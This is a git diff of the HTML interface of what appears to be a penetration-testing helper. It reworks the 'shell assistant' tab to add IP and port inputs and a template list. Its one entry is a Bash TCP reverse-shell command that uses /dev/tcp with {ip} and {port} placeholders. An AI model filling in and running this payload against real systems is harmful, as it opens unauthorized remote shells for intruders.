@@ -9,6 +9,11 @@
     <script src="assets/js/libs/crypto.min.js"></script>
     <script src="assets/js/libs/bcrypt.min.js"></script>
 
+    <!-- hightlightjs START -->
+    <link rel="stylesheet" href="assets/js/libs/highlightjs/styles/atom-one-dark-reasonable.min.css">
+    <script src="assets/js/libs/highlightjs/highlight.min.js"></script>
+    <!-- hightlightjs END -->
+
     <style>
         .nav-link.active-link {
             color: #0056b3 !important; /* Custom color for active links */
@@ -816,31 +821,11 @@
                     <ul class="nav nav-tabs" id="shell-assistant-tab" role="tablist">
 
                         <li class="nav-item">
-                            <a class="nav-link active" id="shell-assistant-linux-tab" data-bs-toggle="tab"
-                               href="#shell-assistant-linux-content" role="tab">
-                                <img data-bs-toggle="tooltip"
-                                     data-bs-placement="right" title="Linux shells"
-                                     src="assets/icons/navbar/tab-4-shell-assistant/linux.png"
-                                     width="25px" height="25px;">
-                            </a>
-                        </li>
-
-                        <li class="nav-item">
-                            <a class="nav-link" id="shell-assistant-windows-tab" data-bs-toggle="tab"
-                               href="#shell-assistant-windows-content" role="tab">
-                                <img data-bs-toggle="tooltip"
-                                     data-bs-placement="right" title="Windows shells"
-                                     src="assets/icons/navbar/tab-4-shell-assistant/windows.png"
-                                     width="25px" height="25px;">
-                            </a>
-                        </li>
-
-                        <li class="nav-item">
                             <a class="nav-link" id="shell-assistant-PL-tab" data-bs-toggle="tab"
-                               href="#shell-assistant-PL-content" role="tab">
+                               href="#shell-assistant-general-content" role="tab">
                                 <img data-bs-toggle="tooltip"
                                      data-bs-placement="right" title="Programming language shells"
-                                     src="assets/icons/navbar/tab-4-shell-assistant/programing-languages.png"
+                                     src="assets/icons/navbar/tab-4-shell-assistant/shell.png"
                                      width="25px" height="25px;">
                             </a>
                         </li>
@@ -858,41 +843,78 @@
                     </ul>
                     <!-- shell assistant subtab navigation END -->
 
-
                     <div class="tab-content" id="shell-assistant-tabContent">
+
                         <div class="tab-pane fade active show"
-                             id="shell-assistant-linux-content"
+                             id="shell-assistant-general-content"
                              role="tabpanel" style="height: 485px">
                             <div class="d-flex flex-column justify-content-between h-100">
-                                <div class="mt-2 mb-2">
-                                    <h4> Linux shells </h4>
+
+                                <!-- local IP and PORT START-->
+                                <div class="form-group d-flex justify-content-between mt-2">
+                                    <div class="position-relative d-flex w-50 me-1">
+                                        <textarea
+                                                class="form-control"
+                                                rows="1"
+                                                id="shell-assistant-local-ip"
+                                                placeholder="{ip}"
+                                                style="width: 100%; padding-right: 40px;"></textarea>
+                                        <a href="#">
+                                            <img class="copy-icon"
+                                                 src="assets/icons/general/copy.png"
+                                                 style="position: absolute; bottom: 5px; right: 5px;"
+                                                 height="25px"
+                                                 width="25px"
+                                                 alt="Copy">
+                                        </a>
+                                    </div>
+
+                                    <div class="position-relative d-flex w-50 ms-1">
+                                        <textarea
+                                                class="form-control"
+                                                id="shell-assistant-local-port"
+                                                rows="1"
+                                                placeholder="{port}"
+                                                style="width: 100%; padding-right: 40px;"></textarea>
+                                        <a href="#">
+                                            <img class="copy-icon"
+                                                 src="assets/icons/general/copy.png"
+                                                 style="position: absolute; bottom: 5px; right: 5px;"
+                                                 height="25px"
+                                                 width="25px"
+                                                 alt="Copy">
+                                        </a>
+                                    </div>
                                 </div>
+                                <!-- local IP and PORT END-->
 
+                                <!-- shell assistant input search START-->
+                                <div class="form-group w-100">
+                                    <input class="form-control w-100" id="shell-assistant-input-search" type="text"
+                                           placeholder="Search..."/>
+                                </div>
+                                <!-- shell assistant input search END-->
 
+                                <ul id="shell-assistant-shell-list-general"
+                                    class="shell-assistant-shell-list list-unstyled text-start h-75">
+                                    <li>
+                                        <h6>Bash - TCP</h6>
+                                        <div class="position-relative" style="width: 100%;">
+                                            <pre style="white-space: pre-wrap; width: 100%; z-index: 0;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2" data-shell-assistant-original-code-value="bash -i >& /dev/tcp/{ip}/{port} 0>&1"></code></pre>
+                                            <a href="#">
+                                                <img class="copy-icon-white"
+                                                     src="assets/icons/general/copy-white.png"
+                                                     style="position: absolute; bottom: 5px; right: 5px; z-index:10;"
+                                                     height="25px"
+                                                     width="25px"
+                                                     alt="Copy">
+                                            </a>
+                                        </div>
+                                    </li>
+                                </ul>
                             </div>
                         </div>
-                        <div class="tab-pane fade"
-                             id="shell-assistant-windows-content"
-                             role="tabpanel" style="height: 485px">
-                            <div class="d-flex flex-column justify-content-between h-100">
-                                <div class="mt-2 mb-2">
-                                    <h4> Windows shells </h4>
-                                </div>
 
-
-                            </div>
-                        </div>
-                        <div class="tab-pane fade"
-                             id="shell-assistant-PL-content"
-                             role="tabpanel" style="height: 485px">
-                            <div class="d-flex flex-column justify-content-between h-100">
-                                <div class="mt-2 mb-2">
-                                    <h4> Programming language shells </h4>
-                                </div>
-
-
-                            </div>
-                        </div>
                         <div class="tab-pane fade"
                              id="shell-assistant-msf-content"
                              role="tabpanel" style="height: 485px">
@@ -900,10 +922,9 @@
                                 <div class="mt-2 mb-2">
                                     <h4> MSF-venom shells </h4>
                                 </div>
-
-
                             </div>
                         </div>
+
                     </div>
                 </div>
                 <!-- tab 4 (shell assistant) end -->
